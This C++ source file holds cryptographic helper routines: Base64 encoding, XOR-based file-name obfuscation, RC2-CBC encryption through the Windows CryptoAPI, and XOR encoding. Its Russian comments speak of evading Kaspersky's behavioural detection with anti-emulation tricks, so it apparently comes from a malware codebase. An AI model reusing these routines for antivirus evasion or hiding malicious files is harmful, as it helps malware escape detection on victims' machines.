#include "core\crypt.h"
#include <wincrypt.h>
#include "core\file.h"
#include "core\debug.h"
#include "core\abstract.h"

namespace Crypt
{

bool Init()
{
	return true;
}

void Release()
{
}

//конвертирование в base64

//данная версия функции может палится поведенческой защитой KAV, но антиэмулиционная защита пока решает эту проблему
bool ToBase64( const void* data, int c_data, StringBuilder& s )
{
	if( data == 0 || c_data < 0 ) return false;
	DWORD resSize;
	//считаем необходимое количество байт для конечной строки
	//флаг CRYPT_STRING_NOCR ставим так как в WinXP CRYPT_STRING_NOCRLF не поддерживается, и поэтому в конце будет только символ \n
	if( !API(CRYPT32, CryptBinaryToStringA)( (BYTE*)data, c_data, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF | CRYPT_STRING_NOCR, nullptr, &resSize ) ) return false;
	s.SetEmpty();
	if( !s.Grow(resSize) ) return false;
	if( !API(CRYPT32, CryptBinaryToStringA)( (BYTE*)data, c_data, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF | CRYPT_STRING_NOCR, s.c_str(), &resSize ) ) return false;
	//в WinXP флаг CRYPT_STRING_NOCRLF не поддерживается, поэтому в строке могут быть символы \r\n, ниже следующий цикл убирает их
	char* to = s;
	char* from = to;
	while( *from ) 
		if( *from < ' ' ) 
			from++;
		else
			*to++ = *from++;
	*to = 0;
	s.SetLen( to - s.c_str() );
	return true;
}

/*
static char EncodeCharBase64( int c )
{
	if( c <= 'Z' - 'A' )
		return 'A' + c;
	if( c <= 'Z' - 'A' + 1 + 'z' - 'a' )
		return 'a' + c - ('Z' - 'A' + 1);
	if( c <= 'Z' - 'A' + 1 + 'z' - 'a' + 1 + '9' - '0' )
		return '0' + c - ('Z' - 'A' + 1) - ('z' - 'a' + 1);
	if( c == 'Z' - 'A' + 1 + 'z' - 'a' + 1 + '9' - '0' + 1 )
		return '+';
	else
		return '/';
}

bool ToBase64( const void* data, int c_data, StringBuilder& s )
{
	if( data == 0 || c_data < 0 ) return false;
	uint resSize = (c_data + 2) / 3 * 4; //сколько символов будет в кодировке base64
	s.SetEmpty();
	if( !s.Grow(resSize) ) return false;
	byte* p = (byte*)data;
	int cp = c_data;
	char* ps = s.c_str();
	while( cp > 0 )
	{
		int three = p[0] << 16;
		if( cp >= 2 ) three |= p[1] << 8;
		if( cp >= 3 ) three |= p[2];
		ps[0] = EncodeCharBase64( three >> 18 );
		ps[1] = EncodeCharBase64( (three >> 12) & 0x3f );
		ps[2] = (cp > 1) ? EncodeCharBase64( (three >> 6) & 0x3f ) : '=';
		ps[3] = (cp > 2) ? EncodeCharBase64( three & 0x3f ) : '=';
		cp -= 3; p += 3; ps += 4;
	}
	s.SetLen(resSize);
	return true;
}
*/

bool FromBase64( const StringBuilder& s, Mem::Data& data )
{
	DWORD resSize;
	if( !API(CRYPT32, CryptStringToBinaryA)( s.c_str(), s.Len(), CRYPT_STRING_BASE64, nullptr, &resSize, nullptr, nullptr ) ) return false;
	if( !data.MakeEnough(resSize) ) return false;
	if( !API(CRYPT32, CryptStringToBinaryA)( s.c_str(), s.Len(), CRYPT_STRING_BASE64, (BYTE*)data.Ptr(), &resSize, nullptr, nullptr ) ) return false;
	data.SetLen(resSize);
	return true;
}

StringBuilder& Name( const char* name, const char* xor, StringBuilder& s )
{
	int c_name = Str::Len(name);
	char* mem = (char*)Mem::Alloc(c_name);
	const char* src = name;
	char* dst = mem;
	const char* x = xor;
	while( *src )
	{
		*dst = *src ^ *x;
		src++; dst++; x++;
		if( *x == 0 ) x = xor;
	}
	ToBase64( mem, c_name, s );
	Mem::Free(mem);
	//убираем в конце знаки =
	int i = s.Len();
	while( i > 0 ) 
		if( s[i - 1] == '=' )
			i--;
		else
			break;
	s.SetLen(i);
	return s;
}

StringBuilder& FileName( const char* xor, StringBuilder& fileName )
{
	char* ptr = Path::GetFileName( fileName.c_str() );
	if( ptr )
	{
		int p = ptr - fileName.c_str();
		int p2 = fileName.IndexOf( p, '.' ); //находим расширение
		if( p2 < 0 ) p2 = fileName.Len();
		char oldc = fileName[p2];
		fileName[p2] = 0;
		StringBuilderStack<128> name;
		Name( ptr, xor, name );
		fileName[p2] = oldc;
		fileName.Replace( p, p2 - p, name );
	}
	return fileName;
}

struct KeyBlobStru
{
	BLOBHEADER header;
    DWORD size;
	BYTE data[64];
};

static bool GenerateKeyRC2( const char* psw, const char* IV, HCRYPTPROV* provider, HCRYPTKEY* key )
{
	*provider = 0;
	*key = 0;
	//Поключаемся к провайдеру
	if( API(ADVAPI32, CryptAcquireContextA)( provider, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT ) )
	{
		KeyBlobStru keyBlob;
		//импортируем ключ
		Mem::Zero(keyBlob);
		keyBlob.header.bType = PLAINTEXTKEYBLOB;
		keyBlob.header.bVersion = CUR_BLOB_VERSION;
		keyBlob.header.aiKeyAlg = CALG_RC2;
		keyBlob.size = Str::Len(psw);
		Mem::Copy( keyBlob.data, psw, keyBlob.size );
		if( API(ADVAPI32, CryptImportKey)( *provider, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, key ) )
		{
			//Настраиваем ключ
			if( API(ADVAPI32, CryptSetKeyParam)( *key, KP_IV, (BYTE*)IV, 0 ) )
			{
				DWORD cryptMode = CRYPT_MODE_CBC;
				if( API(ADVAPI32, CryptSetKeyParam)( *key, KP_MODE, (BYTE*)&cryptMode, 0 ) )
				{
					DWORD padMode = PKCS5_PADDING;
					if( API(ADVAPI32, CryptSetKeyParam)( *key, KP_PADDING, (BYTE*)&padMode, 0 ) )
						return true;
		       }
			}
			API(ADVAPI32, CryptDestroyKey)(*key);
		}
		API(ADVAPI32, CryptReleaseContext)( *provider, 0 );
	}
	return false;
}

bool EncodeRC2( const char* psw, const char* IV, Mem::Data& data )
{
	bool ret = false;
	HCRYPTPROV provider;
	HCRYPTKEY key;
	if( GenerateKeyRC2( psw, IV, &provider, &key ) )
	{
		DWORD resSize = data.Len();
		if( API(ADVAPI32, CryptEncrypt)( key, 0, TRUE, 0, 0, &resSize, 0 ) )
		{
			DWORD sz = data.Len();
			if( data.MakeEnough(resSize) )
			{
				if( API(ADVAPI32, CryptEncrypt)( key, 0, TRUE, 0, (BYTE*)data.Ptr(), &sz, resSize ) )
				{
					data.SetLen(resSize);
					ret = true;
				}
			}
		}
		API(ADVAPI32, CryptDestroyKey)(key);
		API(ADVAPI32, CryptReleaseContext)( provider, 0 );
	}
	return ret;
}

bool DecodeRC2( const char* psw, const char* IV, Mem::Data& data )
{
	bool ret = false;
	HCRYPTPROV provider;
	HCRYPTKEY key;
	if( GenerateKeyRC2( psw, IV, &provider, &key ) )
	{
		DWORD sz = data.Len();
		if( API(ADVAPI32, CryptDecrypt)( key, 0, TRUE, 0, (BYTE*)data.Ptr(), &sz ) )
		{
			data.SetLen(sz);
			ret = true;
		}
		API(ADVAPI32, CryptDestroyKey)(key);
		API(ADVAPI32, CryptReleaseContext)( provider, 0 );
	}
	return ret;
}

void EncodeDecodeXorVector( void* data, int c_data )
{
	if( Abstract::SizeXorVector <= 0 || Abstract::XorVector == nullptr || data == 0 || c_data <= 0 ) return;
	byte* p = (byte*)data;
	int i = 0;
	while( c_data-- )
	{
		*p++ ^= Abstract::XorVector[i];
		if( ++i >= Abstract::SizeXorVector ) i = 0;
	}
}

}
